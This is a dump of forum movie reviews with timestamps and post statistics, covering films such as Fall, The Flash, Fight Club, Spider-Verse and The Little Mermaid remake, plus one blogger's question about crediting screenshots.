starring Grace Caroline Currey, Virginia Gardner, Mason Gooding and Jeffrey Dean Morgan
written by Scott Mann and Jonathan Frank
directed by Scott Mann
Rating:  ♦♦♦◊◊

Fall is a 2022 survival thriller about two women friends, Caroline and Virginia, who decided to climb a dangerous and abandoned communication tower for thrills and as therapy, to help Caroline recover from the death of her husband, Dan, who perished in a fall from El Capitan in the film’s first scene.  At first, Caroline resists, but eventually is won over because of her friendship with Virginia, who spouts predictable and trashy, ill-conceived, and Gung Ho American cultural platitudes like, 

“If you don’t confront your fears, you’re always going to be afraid.”

“I’ll rest when I’m dead.”


The plan is to scatter Dan’s ashes from atop the B67 TV Tower.  According to the director, the story is based on the real KXTV/KOVR Tower, a.k.a. the Sacramento Joint Venture Tower, a 625-meter tall communication tower in Walnut Grove, California.  It’s the seventh tallest man-made structure ever to have existed.

Of course, the ascent of the abandoned tower goes horribly wrong.  That’s why the movie was made.  The ascent is white-knuckle, nail-biting stuff even for the audience.  Once the girls are up there, the ladder they climbed crumbles with age and rust, and they are stuck, with no phone reception, no way to safely descend, and no back-up plan.

I felt uncomfortable watching it because I have no regard for the kinds of adventure-seeking recklessness it portrays, or for casually dumb American platitudes about facing your fears, growing through adversity, or cultivating the human spirit of exploration and stretching one’s potential.

I watched this film the same day it was announced that the deep sea OceanGate Titan submersible had imploded during a dive to the Titanic wreck in the North Atlantic Ocean, killing five occupants.  All week it was the story that gripped the world (contrasting with the story of 82 migrants who drowned in the Aegean Sea near Greece just one week earlier).

I admire intelligence, and I dislike stupidity.  That means I’m prejudiced.  I don’t like deliberately stupid people, and I enjoy stories of Darwin Award stupidity in which people remove themselves from the human genome.  Stories like that are sadly entertaining, but also annoying.  Take, for example, the 1992 case of Chris McCandless who left his family and his life in California to live off the land in Alaska in pursuit of some moronic-idealistic dream, only to die of starvation.  The incident is portrayed in the 2007 movie Into the Wild.  What an idiot!

Then, there is the 2009 case of cave diver John Jones who became fatally stuck in the infamous Nutty Putty cave in Utah.  His story is told in the 2016 movie The Last Descent.  A guy with a really stupid appetite for risk.  What an idiot!

Real life stories of these kinds give you an idea of what things look like from the top of Mt. Stupid!",moviereviews,2987,498,66,0
1688180824.0,The Pope's Exorcist,"The Pope’s Exorcist
starring Russell Crowe, Daniel Zovatto, Alex Essoe and Franco Nero
screenplay by Michael Petroni and Even Spiliotopoulos
directed by Julius Avery
Rating:  ♦♦♦♦◊

Based on the An Exorcist Tells His Story, and An Exorcist:  More Stories by Fr. Gabriele Amorth.  I liked this movie.  It was a scary, supernatural thriller based on the life and experiences of a real Vatican exorcist.  Fr. Amorth is an earthly priest with a sense of humor, who rides around on a scooter.  But he’s deadly serious about his work, who occasionally suffers doctrinal and personality conflict with the Church hierarchy.

In The Pope’s Exorcist, Fr. Amorth is called to a former monastery in Spain that is now converted to a private home    -  an extremely run-down, neglected, and therefore spooky property.  During repairs and renovations to the building, the American owners are experiencing frightening disturbances and so, like in The Exorcist (1973, directed by William Friedkin, featuring Linda Blair), they call on a priest for help.  Or, rather, a demon who is possessing the family’s son orders them to call a priest.  And, not just any priest, but Fr. Amorth himself.  That in itself is disturbing.  The idea that the demon has uncanny knowledge about Fr. Amorth is disturbing.  It transpires that the demon’s intention is to possess Fr. Amorth so that it can corrupt the Church from within  -  sort of like what's already happening with the continuing, endemic sex scandals there.``

With the assistance of an inexperienced local priest, Fr. Amorth learns the name of the demon, which allows the two to perform a successful exorcism.  The Pope then assigns the two to pursue similar exorcisms at a number of other known spiritually troubled locations.  Could that mean a series of similar films in the future?  Hollywood loves a sequel.  Sequels are successful movies are gold mines.

There is an interesting struggle going on here between tradition and modernity.  Modern, educated priests and Church leaders want to downplay the Church’s history of exorcisms in favor of a more metaphorical and scientific interpretation of these phenomenon, while Fr. Amorth’s belief is thoroughly Orthodox on these matters.  The exorcist has the support of the Pope, which shields him somewhat from interference by less orthodox churchmen.",moviereviews,2333,374,55,0

It is literally crazy that it stars Zendaya, cause even if it didn’t I would call it the “Euphoria” of movies. I don’t know what’s up with her and wanting to star in the grossest stuff ever, especially stuff that sexualizes teens. Here’s all the stuff I already find weird with the trailer, and I know people hate it, but I’m gonna be using a lot of the “Reveres the roles” argument.

- It’s very first scene is teenage Zendaya commanding two other teenage friend boys to do sexual stuff with her while she looks smug…I can’t even begin to describe how this rubs me the wrong way. For one I’m 100% about monogamy, and for another reason it’s TEENS. First role reversal, imagine it’s a guy who commands two girls to sexually please him while looking smug…yeah that movies never getting made today

- You can see that she ends up marrying one of them when they’re older, and they’ve stopped being friends (most likely cause of the awkward af threesome). Her husband is show saying “I love you” and in a girlboss moment she goes “I know” with a smirk then walks off. It then shows her fucking his friend again. So yep, there’s also cheating

- “I have to take good care of my little white boys” sheesh, literally wtf. Role reversal number two. White guy is married to black girl, gets a black mistress “I have to take good care of my black girls”

- The point a lot of people are bringing up, the Tom Holland point. I don’t care WHO you are, I get it’s acting, if you have enough money you never have to work again, then you take a role where your main purpose is to be the sex icon to be shared between two people in multiple scenes you are A BAD SPOUSE. This wasn’t some Rosa park’s documentary or something, this movie isn’t gonna have an impact or something, you literally could have just not taken the role

And I’ve seen multiple people replying to others saying the trailer is weird with “Oh no you’ll see this director is actually really good!” Wow man that’s really cool, if Steve Irwin took a shit on the floor it’d still be a pile of shit, and from the trailer that’s all I’m seeing, shit",moviereviews,2097,392,32,0
1687444200.0,Spider-Man: Across the Spider-Verse,"*Across the Spider-Verse* is told with a dizzying mix of animation styles that characterized the first movie.  However, the overt comic-book influences have taken a back seat to abstract and impressionist stylings that both reflect the underlying emotions of many key scenes.  The movie’s two set-pieces, Mumbattan and the Earth-928 chase sequence are so incredibly detailed and staged that if I try to describe them I would fail to do them justice.  Overall, *Across* is truly amazing and is a testament to how producers Chris Miller and Phil Lord strove to make this movie more than a repeat of what they’ve done before.

As before, there’s a wealth of inspired voice acting, with Isaac, Schwartzman, Rae, Soni, Whigmham and Daniel Kaluuya (hilarious as Hobie Brown a.k.a. Spider-Punk) joining returnees Moore, Stienfeld, Brian Tyree Henry (Captain Jeff Morales) and Luna Lauren Velez (Mrs. Morales).  The dialog is a sharp mix of humor and heartfelt drama, with the best scenes being those with Miles and Gwen talking to their parents.  Topping everything off is Daniel Pemberton’s exceptional, multi-faceted score.  All of the superlatives you’ve heard others use to describe the movie–that it's amazing, spectacular, fantastic, thrilling, etc. are all true.  *Across the Spider-Verse* is one of the best superhero movies ever made, and one of the best movies of 2023.  **Highly Recommended**.

1687048422.0,Vivarium (2019),"This is a film that people seem to either love or hate. I love it. Here's why. 

Spoilers.

The amazingly astute subtext of ""Vivarium's"" story probes deeply into modern domesticity and elevates the film beyond a typical sci-fi/psychological horror film. Some people say the cukoo's nest prologue is heavy handed symbolism, but the imagery works as a powerful thematic introduction and sets a appropriately disturbing tone.

More than a parasite analogy, ""Vivarium"" is a powerful allegory for raising a child from birth to independence, presented in a temporal microcosm. The filmmakers nail the realities of the exhaustion, the annoyance, and the frustration inherent in the institution of parenthood. Though this theme is woven throughout the film, three examples stand out.

The annoying ""woof woof"" dog imitation presented throughout the movie is an almost too perfect example of how kids just being kids will drive parents nuts with their frustratingly underdeveloped scope of the world and of other people's indifference to, or even disdain for, subjects and activities the child finds interesting or exciting. A child's affinity for mind-numbing repetition whether in stories, foods, or animals sounds, is exasperating.

The frustration that arises from a power struggle over the television is particularly relatable as the child, at all hours, watches alien programming that's nothing but gibberish to the parents - a perfect metaphor for the uncomfortable, otherworldly, and inevitable external influences that shape a child's psyche. The hope for a child's independence butts heads with the desire to control them.

In stark contrast to this depiction of the futility of trying to mold a child in their image, the film perfectly presents the truly horrific power of parental influence as their own worst impulses are thrown back in a their face when they hear their own words and tones come out of their kid's mouth - a living curse and reminder of a parent's innate imperfections. 

As for ""whys"" intrinsic to parenthood, the film recognizes a deep-seated cognitive dissonance in the parental role which is eloquently displayed  in the authenticity of Jesse Eisenberg's character's internal conflict. He resents his situation to the point of abusing and neglecting his partner and his ""child,"" yet he remains compelled to literally work himself to death as he instinctively toils to provide a better life for the family he never wanted. And through it all, Imogen Poots's innate drive to care for and even love the child despite her disgust and despair is simultaneously maddening, pitiful, and disturbingly honest. Biology is easily exploited - bringing the viewer back full circle to the cuckoo.

In the end, they raise a kid who doesn't appreciate them and leaves them behind. For their efforts, all they've really done is perpetuate a human cycle that's presented as unrewarding and pointless. 

Beautifully bleak and nihistic.",moviereviews,2941,465,70,0
1686972984.0,"The Flash- Overhyped, Underwhelmed, Mid","*non spoiler*

A couple months ago prescreening began, and the early reviews were flowing. Critics, celebrities, and execs were raving! Social media influencers were dramatically  drooling and figuratively falling out of their chairs over this film. It was the greatest thing they’ve ever seen. 

 I was mega hyped for this movie, ever since 2018 delay after delay AFTER delay I never gave up because I had a feeling this film would be amazing.. that being said, it was ok. 

Now don’t get me wrong, the movie isn’t awful.. it’s ok. The movie isn’t great it’s just.. ok. 

The first 2 acts of this movie is well paced until you realize it drags so much to set up the plot of this film by using a lot of comedy to fill in that runtime. That was my issue with this film, they took an iconic storyline like flashpoint.. and created a version with lower stakes, less broadened. It feels like a shell of Flashpoint filled with jokes and banter to stretch it out. 
I mean if you want to make a flashpoint movie on a lower scale, that’s ok but at least fill in that runtime with something of more significance. It’s a story about doing something drastic to save your parents’ lives but there are a lot of missed opportunity to develop more heart and emotion. This movie should of made people weep. 

The cameos towards the end were cool, yeah, but just felt forced or unnecessary.. it wasn’t anything significant to the plot, they were just there to make your nostalgia bell ring. I thought this film’s rendition of the speed force and time traveling just looked so weird or goofy. The CGI looked REALLY rough and was getting Scorpion King vibes, especially during the “baby shower” scene.. the CGI work in several scenes was just so off-putting it took out the movie a few times because it felt so cringe. 

The third act was great but honestly wasn’t nearly enough to make me feel like it was the greatest 3rd act in a super hero film like the prescreeners we’re trying to make people believe. The best action sequences are from Batman and Supergirl while creativity lacks HEAVILY when it came to the flash. Seriously, a big budget blockbuster about a speedster hero and this was the best they can imagine when it came to his action sequences?? Quicksilver from the X-men franchise still has to best speedster action sequences to this day and that shouldn’t be the case after this film. 

The twist was cool, it wasn’t mind blowing. The cameos were fun but had a short-lived affect and just came off as non sensical. You want to give us cameos- show us the Reverse Flash, Wally West, Max Mercury, Johnny Quick, or how about Grant Gustin’s Flash and use him as an emotional device to teach this Barry why he must let him mom die. These would of been cameos more sensical to a Flash storyline. 

Christina Hodson wrote a “good script”because the only good parts about it are the Flashpoint elements. Everything else feels filler and small scaled. Ezra did good job portraying this DCEU version of Barry, but it frustrates me because this isn’t the Barry Allen we know and love from the source material. They were so off the mark with Barry Allen it feels like the writers never even read a Flash comic book. The choice to use the classic Flashpoint storyline isn’t a bold or ambitious, it’s safe. It’s safe because it was much easier to use a storyline most fans are familiar with rather than creating an original and grounded Flash story involving one of his many popular villains. (Seriously, we couldn’t get at least ONE rogue in this movie?!) The writers played it safe because they took an iconic storyline, downscaled it, sprinkled in the basic elements and filled the rest with comedy and banter. For a movie about a speedster involving the ultimate time traveling/alternate reality storyline, it lacks imagination and creativity, but at least the light-heartedness is there",moviereviews,3874,681,72,0

1686839759.0,Hi guys. This is going to be my review for The Flash. Minor spoilers ahead.,"Going into the movie , I was a bit scared because the most of the DCEU have been a bit of a miss to say the least. I am really grateful that DC/WB gave us a live action Flashpoint movie .But this movie actually better than I expected. I seriously can't believe WB got Keaton back as Batman and believe it or not he is still as good as he was back in Tim Burton's movies. I mean he seriously still got it. The Visual Effects for the most part of the movie was stunning specially when Flash is using his powers. Ezra Miller actually gave a great performance but sadly due to his controversies people are saying negative things about this movie. Ezra played both the versions of Barry brilliantly . The action sequences were Badass. The humour was good. The camerawork in the first action sequence made me speechless. Andy perfectly balances everything the humour, the action , the nostalgia and of course the emotional core of the movie that is between Barry and  Barry's mother. Sasha Calle as Supergirl was a good addition. I would love to see here in the future DC projects. It was great to see Michael Shanon back as Zod. It was also fun to watch Ben Affleck as Batman. The cameos are overall good. But then there is a major issue them. It felt like they shot a couple of cameos and then probably they seriously dumped a good amount of cameos in the climax scene. So , what I mean is that they were unable to execute a part of the 3rd act properly. The post credit scene is kinda random to say the least.",moviereviews,1506,284,28,0

1686568235.0,Movie Blogging and Copyright Credits,"First of all, hello.

I run a horror movie blog. The one thing I've been struggling with and haven't been able to find a clear answer for is when you include screenshots from a film, who do you credit?

I usually credit both the production company and distributor to be on the safe side. It makes sense that it would mainly be the production company (some of the convoluted information I have managed to dig up assures me of this), but when it's a company I've never heard of that was distributed by say Warner Bros., then it stands to reason you would credit it to them as well. At least by my logic and reason, not necessarily anyone else's.

I get my sources from IMDB, and sometimes they make it easier by including the actual copyright holder, but not always. Also, do you credit the ""presents"" production company over others? Sometimes they have one or two companies at the top out of alphabetical order, then followed by more companies in order. Does that make these companies more involved and should be credited over the rest?

I've seen the big name distributor credited for video clips over the production company on videos by the likes of Watchmojo and Whatculture, so this has increased my confusion.

I know this isn't strictly a blog sub, but I have asked this there before, and since it covers all kinds of blogs, not just movies, it seems harder to get a helpful response. There also doesn't seem to be a sub specifically for movie blogging.

Getting a clear answer will help me to cut down on time and text when getting the copyright claims, which is why I'm looking for assistance on this. I'm basically just trying to make this a bit simpler to cut down on frustration and energy.

Thank you so much for your time, and any help you can give. I appreciate it greatly.",moviereviews,1786,323,46,0

1686347610.0,A Fight Club Review (SPOILERS)," 

This film follows two people who turn out to be the same person - Tyler Durden. The Narrartor is an insomniac, and discontent with the corporate, mundane job he has, attending different distress groups to feel something. He and Tyler start a fight club - a group of guys who bare knuckle brawl on Saturday nights, gaining a catharsis and ‘high’ from it. The club builds and grows eventually escalating into a terrorist group, hell bent on destroying the consumerist, possession filled lives we live. The narrator realizes the severity of what he has seemingly unconsciously created, and frantically tries to stop it, but for the banking towers his people rigged charges under, it’s too late. The Narrator kills the other side of himself - the dark, drastic and unstable Tyler Durden. He is born anew as the city explodes before him and Marla.

An absolute masterpiece the more thought and digging you do. There are so many interpretations, meanings, easter eggs and theories to derive from this movie. The more I read up on it, and do some thinking of my own, it keeps coming together in a beautiful way. I love how the ambiguity of it all is never too far fetched, never too abstract to where you’re just lost. It’s all grounded to some degree in a real and tangible world, and therefore makes for such interesting conversation and thought. 

I subscribe to this: Tyler is a man who is living in a world which does not allow for traditional male emotion and roles. He works a boring, meaningless job which suppresses him in every facet of life. He seeks these distress groups to cope with these feelings and to maybe even feel close to death, like its some release from the shackles of this life (Marla almost states this exactly, which is why their characters are so similar). Tyler created an ideal, manly version of himself as Brad Pitt. A free spirit who’s not held down or held back, someone who’s edgy, handsome, smart, visceral and good in bed. He fantasized about this Tyler in every scenario, creating a version of himself that is all the things he wishes he was. Fight club seemed like a great thing for these men initially - a way to get emotion, anger and frustration out without harming others, a way to let out raw male aggression. This movie speaks to this - how in our modern world this male desire is undeniably suppressed and we are forced to be tame and comply. Forced to be monochromatic. It speaks to the importance of our true feelings and emotions. This movie also warns of the danger that could ensue if this male desire and ego goes unchecked. It is quick to cause destruction and terror. Quick to rebel and turn to extremes such as fascism. Quick to harm others and cause extreme conflict. This is the person Brad Pitt ultimately reflects, males’ darkness inside them that wants nothing more than to be free, rebellious and chaotic. The narrator on the other hand is the tame, happy to comply office worker who is scared of relationships and buys all the possessions society tells us too - he plays along. At the end, The narrator kills the dark side of himself, but doesn’t return to the bland version either - he seems to find a happy medium in the end, one where neither side of himself prevails all the time. The movie tells us throughout that males may need to play rough and let out these urges being suppressed from time to time, but moderation and control is key. In the end, the narrator did what was necessary to ensure this balance. 

There is something every male can relate to in this movie. A desire to rebel? An urge to fight? A tight knit brotherhood or camaraderie? This movie takes these things to the absolute extreme to show us the dangers, but I believe it also gives these ideas breathing room and validity. Every male can latch onto something being talked about here. Maybe the extreme of bare knuckle fighting, maybe just the desire to break free from a life that keeps you down (probably a more reasonable one). 

As if the story wasn’t good enough to hold up the film, David Fincher absolutely man-handled the visual style and tone. He crafted a drab and bleak color palette, hard lighting and high contrast, and stylized camera movement to reflect Tylers duality throughout. The movie succeeds in providing a dark and visceral feeling to the viewer, an uncanniness throughout, that almost makes you unable to sit still. The blood and fighting is brutal, the place these people call home is disgusting (to say the least), and all of the choices made regarding costumes, set design, lighting, props, direction and camera work comes together harmoniously to give you a complete package. A unique visual style that matches the story so well you couldn’t envision it any other way. 

Oh, and also Brad Pitt absolutely stole this movie for me. Norton was great, but Brad really delivered some of the best Ive seen. He had so many punchy lines, deep monologues that encapsulate the film, and in general plays such a layered and intense character. Incredible.

1686141152.0,Review of Shutter Island,"""Shutter Island"" is a thrilling suspense film set on a remote island in Boston Harbor in 1954. The main character, Teddy Daniels, portrayed by Leonardo DiCaprio, is a U.S. Marshal. The story begins with Teddy and his partner Chuck sailing to a mental asylum on the island to investigate the mysterious disappearance of a woman named Rachel from her room.

&#x200B;

Upon arrival, Teddy and Chuck are greeted by a group of policemen who accompany them during the investigation. As they dig deeper, they uncover information about a man named Andrew Laeddis. Teddy, who had also experienced the horrors of war and witnessed concentration camps during his time in Germany, suffers from severe migraines and has haunting visions and dreams of his deceased wife guiding him through the investigation. He is renowned for his sharp intellect and military background.

1686154674.0,Spider Man Across the SpiderVerse is just good.,"So I didn't know that Spider-Man across the spider verse was a part one of a part 2. So I was a little disappointed obviously at the ending. In retrospect, I think the movie is a 4/5 not a 3/5 that I initially gave it. 

However, just because something is a part, one does not excuse it for not having any minor resolutions or payoffs. I know the movie is complete setup but if that is the case then the second movie will be infinitely better because of the resolutions that will be reached. However, I fear that because of all the setup that has occurred with across the spider verse that Beyond the Spider Verse has a lot that it needs to do but I think can do it well. However, I don't think everything will be paid off and some things might be left behind.

Obviously this is the greatest feat in animation we have seen thus far and this has raised and set the bar for movies. Movie alone should win something for animation style or just animation in general. It is literally breathtaking and amazing. I think people go wrong with the movie on this point. Something can look amazing and the cinematography and animation alone can elevate certain scenes to new heights. However there are issues with the story for me.

The movie has a super slow start and much of the beginning fields slightly bloated with things we already know and a protagonist that I personally don't need to know that much about in Spider Gwen. I don't think she's a bad character but to put a lot of her arc in here takes away from the main story I feel. If you remove the spider Gwen backstory The movie for the most part doesn't change. I like it but I want less of it and it feels as if miles and Gwen are competing for the spotlight. 

Because in reality I love Miles Morales and he's the character I've invested in. If you take out the going backstory in the beginning or make it drastically shorter, I can forgive the repetition of Miles' family drama. The pacing and flow would have been much better.

You do get an emotional payoff with Gwen later and that is the one resolution in the movie but it falls flat in comparison to the other big stuff around it.

The introduction of spot is excellent and might be my new favorite Spider-Man villain. I wish we could have had more time with him, but obviously we're going to get a lot of him in the next one. Spider-Man 2099 is great, but there wasn't enough of miles and him battling. It's a great chase scene, but those two fighting would have been awesome. I think you can have a small battle and confrontation with those two isolated as a precursor for what's to come. Why not have miles from us? Even struggling to fight and maybe he's beginning to doubt himself and That's why he decides to run and realize it's maybe I don't have to be strong. I've got to do this my own way.

Did there a lot of spider people trying to stop him so trying to isolate those two would be difficult but I think possible.

Overall it is a good movie just not great. I was probably too harsh because I was disappointed because I wanted more and there's nothing wrong with a movie leaving you to want more. But if that's all a movie it is, in my opinion it did not hit the mark.

As long I know a lot of people are not going to agree with me. But tell me your thoughts. And please don't just tell me it's part one of part two that doesn't excuse a movie.

Infinity war was a great movie that stood on its own, had resolutions and left you on a cliffhanger wanting more and still had its own character developments and resolutions to them and then managed to continue them. There's nothing of that here.

1686064653.0,Spider-man: Across The Spider-Verse FN Review," 

This movie is cool AF, from start to finish we are shown cool scenes, cool outfits, cool enemies, cool allies, cool spidermen.🕸️

I can't say enough good things about this style of animation extrapolated from the movies.

It's a 10/10 for the visuals.🔥

Plus with the ""spider verse"" we get to see hundreds of different interpretations, some obviously for split seconds, of Spiderman's worlds.

This movie focuses a lot on Miles's and Gwen's emotions and real life (meaning not Spiderman's) problems, and this old trick when done properly still works like a charm.

We get to see their loneliness due to the superhero persona and the classical internal struggle of having to keep their identity secret…🎭

After replaying in my head the whole film i'm convinced that even if she has a little less screen time than Miles, Gwen is the one with the most depth as a character. This is a wierd critic, i know. But i feel that Miles, even with more time, is not as capable as her in communicating his emotions...🧐

Every important switch in scenario is introduced with a snapshot of the comic book that it takes place in. Amazing idea ✅

The side characters are interesting enough to not ruin the paste of the movie when they're on screen.🫠

Looking forward to the next Sony animation project:

They have talented writers, director, voice actors and amazing animators 💯💯💯

Animation fans will love it ✔

1686023991.0,watched 65....felt a bit disappointed conflicted,"Just started watching the sci fi Adam driver film 65......but it just was a bit of a mess, cant find the words for this film.

While I've seen all these other reviews and have just watched the new Adam driver movie, 65 is a bizarre film...""not bad but its a ok film"".. I somewhat disagree with both sides saying its a breath of fresh air or on the other end how semi-bad the movie is. Most of the complaints i've seen are about the plot, which I get, it's simple, made to be easily digested, which if you're not looking for a futuristic Sci-Fi movie let alone the cameos of the dinosaurs, you're not getting an overly complicated plot anyways nor a realistic one at that. The CG felt weird. Adam Driver was absolutely exceptional in a role where he's essentially speaking to himself, as his co-star doesn't speak his own language, both of them rely on their body language and were great at conveying their emotions and/or communication. An argument I've seen quite a bit was how this made the plot even harder to digest enjoyably. I personally disagree, I enjoyed this aspect, it of course limited any conversational part of the entire screen time but was an interesting addition. Whilst I do enjoy some of the gimmicks that Sam Raimi and Co decided to use, it was admittedly too much. the plot was simple bare bones 2 survivors have to travel to find an escape pod which sounds ok but the second arc felt flat. I was going in blind not knowing much about this film for the most part. A Pro for this film is, I appreciate mills teaching the child what words are as he shows the girl a cantina of water trying to teach her his language or telling her he's tired but by the 2nd half i was getting bored. The flashbacks with mills kid or the pre recorded scenes of the sick girl talking about how she misses mills was interesting but needed more of that. o ye also wheres the wife?? does the wife have a plot idk the movie forgets it

Hollywood currently has struggles, one which is obsessed with keeping appearances, leaving good impressions and avoiding hurting any feelings for viewers, The movie industry is currently swamped in this ideology; a cancer which is nigh impossible to remove since those in power refuse to hire anyone who disagrees, preferring to languish in their echo chambers, unable to see their shortcomings and choosing only to receive praise at every turn. In a pivotal moment in this movie, when Adam Driver’s life is in danger, he delivers every ounce of emotion and determination only for his co-lead to seem uncomfortable instead of involved. This is absolutely a director’s choice; one that is weighed down by the need to avoid any controversy. What could have been a story of love for our fellow man, and a richly developed tale of a father becomes anecdotal in the hands of mediocre developers. We cannot easily identify with the characters and they are not sufficiently engaging due to the poor script and presentation, although the plot could've been better. ""**why did he crash on earth 65.....million years?"" ""why are their ships built around this time period? where did the ship originate from??"" ""were the other survivors along for the trip volunteering**?"" no explanation, The film just says **""its a sci fi film it doesn't have to make sense**.."" k?.

It's a shame because, I went in expecting some of this to just be a popcorn movie on its own but was left conflicted I wanted more from this film. The director's previous film history hasn't put much out besides the typical horror film, which for pg 13 was tame but was a bit of a let down, but at the same time a better idea for non horror enthusiasts. I enjoyed the cast but felt it needed more time to cook.

There were too many ideas and additions to digest amongst the plot, characters are mills a father who is married and has a sick child, while being 65 Million years in the past is a good idea on its own, having different languages, one being American-English (which, let's be honest, people are expecting Adam Driver to speak in a made-up foreign language or sign language, as well to appease their need for unrealistic realism in a Sci-Fi movie? I'll forgive that due to the absurd expectations some people have), learning that this ""Unknown Planet"" is earth, having his daughter's illness so lazily handled, again Koa's inability to communicate with Mills, and dinosaurs. I loved the concept, their journey to get to their shuttle to escape this foreign planet, being threatened by dinosaurs along the way, I'd only love it more if there were more scenes to really help with exposition, although something I appreciated was that most of that exposition was either done in a way where Mills realistically explained something to Koa, or a show don't tell kind of vibe. I again disagree that this is a failure of a movie, what it is, is a movie that albeit had a lot more potential than the finished project, had a decent storyline, cast and antagonist, and paying homage to Jurassic Park with certain plot points or clichés (which to be fair, there weren't many overdone clichés). but What I wanted was more plot.., was the lore behind this planet Mills came from, maybe a scene where their rescue is complete, I know we know that they've survived and surely have been rescued but there needed to be closure, the runtime allowed more than enough for more story telling. I don't want to write an entire essay but I'd like to say, this is one of those occasions where you shouldn't read into the bad or good reviews too much as you might find it to be a waste of 90 minutes or pleasantly surprised, I know I was, where the plot has been overdone with the inspiration this movie takes from other franchises, it fails to explain many many many plot points that could be interesting to the audience That being said, the concept is pretty eye-catching, the special effects were decent not bad but not brilliant, and as the movie stands, I enjoyed the action and emotional aspects of the film. if you like sci fi & Dino's give it a shot...but i was left disappointed. The CG felt mixed as well some good some a bit too real but goofy. just a shame there could've been a better script to this film.",moviereviews,6189,1110,162,0

There are 6 core characters, already something difficult to balance. Jake, Neytiri, their children Kiri, Tuktirey, Lo'ak, and Neteyam. Not speaking the Na'vi language (obviously) didn't help with remembering the names but besides that they felt fairly flat. Lo'ak got some plot narrative and character development but Neytam was mostly just, there.

Bringing back Quaritch (not a spoiler) via cloning made his defeat in the first movie feel a bit meaningless since they can just keep cloning him making him theoretically immortal?

The settings are pretty but felt lesser than the first film.

The narrative felt bloated to the point of not that engaging.

1685446375.0,Guardians of the Galaxy Vol. 3,"As advertised, *Guardians of the Galaxy Vol. 3* is the final adventure for this group of a-holes.  Gunn’s affection for these characters has been evident from the beginning, and he gives them a sendoff that is incredibly moving, hilarious and exciting.  The plot connecting everything is a little clunky, but the movie is filled with everything that I’ve come to appreciate from this franchise: the adolescent humor, the sci-fi weirdness, the bonkers physical comedy and most importantly, friendship.  (Every wisecrack and insult is rooted in love.  Believe it.)  While the ever-evolving relationship between Peter and Gamora remains a focal point of the story, Gunn gives the other members of the team moments to shine.  Having oddballs Drax, Mantis and Nebula play key roles in the outcome was an unexpected stroke of genius.  The practical and CGI effects are some of the best the MCU has ever done.  There’s one fight scene in the last act that was simply awesome.  *Vol. 3* is not only one of the funniest Marvel movies I’ve seen, but probably the saddest as well.  The tragedy of Rocket’s origin story was so moving, I completely forgot I was getting misty-eyed over a CGI character.  Speaking of which, *Vol. 3* makes a very impassioned and convincing argument against using animals for scientific experiments.  That Disney allowed Gunn to speak out on such a difficult issue, in a superhero movie no less, is commendable.  I’ll miss Star-Lord, Drax, Rocket, Groot, Nebula and Mantis.  Whomever follows this group has a tough act to follow.  **Highly Recommended**.

I have no problem with being more inclusive with women in Star Wars, but the fact that it has been at the expense and exclusion of our male heroes when, let’s be honest, the majority of fans are men, is insane to me. Again, know your audience! 

Why is Darth Vader not being explored? His pain and suffering in the wake of turning to the dark side? His heartbreak over losing Padme? His inner conflict with the light buried deep inside of him? Why are the Jedi and the force not the primary focus anymore? Why are we not getting epic light saber battles? How is it that the choreography of light saber duels in the prequel’s over 20 years ago so much better than what we got in the sequels? 

I beg you, Disney, turn towards the light, correct these mistakes that are so painfully obvious. I’m up for hire if you need any ideas!",moviereviews,1425,265,29,0

1685269405.0,The Machine (Review) : 92%,"Bert Kreisher has finally found his niche; a successful Comedic Actor and Producer for the foreseeable future.

His debut movie The Machine was an Absolute Surprising Delight.

After just watching what I found to be a lacklustre finish to a Trilogy in the current form of Guardians of the Galaxy Vol. 3 and the latest offering from the Billion Dollar Franchise, Fast X… 

This was completely refreshing, 
I would even put it on par with 
Fast X for the sheer overall
Entertainment Value.

Bert is a natural (or seems to be),
with gracious to his long-term 
friend and fellow Podcaster
Joe Rogan with an Onnit 
product placement in the movie,
and a positive message to actor
Charlie Sheen and “Tip of the Hat” 
to Eddy Murphy.

Mark Hamill was Both; Brilliant 
and something I didn’t expect
Hugely Hilarious.

Found the Production Value
Fantastic, with some Amazing 
locations and sets.

It’s also to rewarding to see 
that Bert and his wife LeeAnn 
were amongst the Producers, 
hoping keeping not only a good
back-end percentage of profits
but also control over the future
distribution of his content.

If you don't want the lengthy read below...The TLDR is that it's better than the original at times but it's worse in some areas too and lacks the artistic style charm of the original.
I'd give it 6.8 out of 10 with the main criticism being it's overly dark to the point you can't see a lot of things and the ending fight scene was ruined big time.

For the actual review:

Pros:

1: The rescue scene where Ariel saves Eric is superior in every way,  not even a competition.
It blows the original scene out of the water.

2: Part of your world is better music wise.
Had they not butchered the under water scenes here during the song I'd say it was the better version.
But during the most of the song it doesn't feel like she's under water.

3: Ursulas ""Poor Unfortunate Souls"" song is better in terms of visuals and she comes off as way more vile than the cartoon version.
This live action Ursula had me mentally calling her a wretch which the original never has.


4: Eric has a song in the movie which feels like it belongs.
It however is harmed a bit by it being dragged out.
It should have been a quick 30-40 second tune.
Instead it's several minutes long and feels like a Youtube music video right down to the visuals and doesnt feel like a character singing spur of the moment.
The women in the theater were cooing to it though and so I think that was the directors intention.






Cons:

1: The by far biggest issue is the lighting under water.
The movie is way too dark to the point that the end battle scene has it so you can't even see the characters faces and can barely make out Ursulas tentacles or Prince Eric's boat at several points.
During Ursula's song it's the same issue during a few parts of it, as well as with the early Ariel underwater scenes like her exploring the shipwreck with Flounder. It's just way too dark visually.


2: The movie lacks the charm of the original due to the live action making Sebastian and Flounder look like they're a children's toy.
This ruins the entire song ""Under The Sea"" as the original movie scene for it was visual heavy on the other ocean life playing musical insteuments and jiving to the song in creative ways.
This version falls flat on its face, not good at all visually but is still extremely catchy beat wise.
The whole theater was bobbing their heads and dancing in their seats during it.
Ariel sings during it temporarily too which ruins the flow of it for a short bit until it picks back up again.

3: King Triton lacks his imposing presence of the original movie.
In this movie he feels like any random dude rather than a powerful king and this is most evident during the end fight scene between him and Ursula.
Even the scene where he destroys Ariels human world stuff in her cave, he doesn't come off as powerful like he did in the original movie.
They also made Ursula and King Triton feuding siblings unlike in the original which was kind of stupid as it undermines Ursula's evil nature a bit.


4: Ariel's sisters are a bunch of different ethnicities and just felt a little odd given they're supposed to be siblings from the same parents. 
None of them even play any important role and they're only on screen a few seconds total.
They do however looked amazing and their tails are much more detailed and beautiful than Ariel's.


5: They made Scuttle a girl.
He should have remained male and they expand the role quite a bit and give Scuttle her own song which was unnecessary i felt as its not even very good and just feels out of place.


6: Lastly, they really dropped the ball with the ending.
The end fight scene isn't the same at all.
Ariel is the one that stabs Ursula, with the boat, instead of Eric, and the King Triton being defeated by Ursula scene was absolute garbage made even worse by a bad underwater effect which makes them look more like they're floating in space rather than underwater.

